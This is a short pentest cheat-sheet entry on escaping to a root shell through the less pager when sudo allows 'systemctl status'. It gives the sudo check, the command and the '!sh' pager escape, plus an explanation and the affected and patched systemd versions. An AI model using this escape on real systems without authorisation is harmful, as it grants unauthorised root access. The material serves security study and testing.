# systemctl

## Exploit: Shell using less pager

***

```sh
sudo -l

(ALL) NOPASSWD: systemctl status some.service
```

Check if you have permissions to run `systemctl status` as root

```
sudo systemctl status some.service
```

In the pager (less), enter:

```
!sh
```

### Why?

Explanation: In certain versions of `systemd` , `less` was the default pager for `systemctl`. `less` allows users to run shell commands using `!command`. These versions did not tightly control the `SYSTEMD_PAGER` variable, enabling shell access from the pager.&#x20;

Vulnerable version: `systemd` versions before 247

Patched version: `systemd` version 247 and later

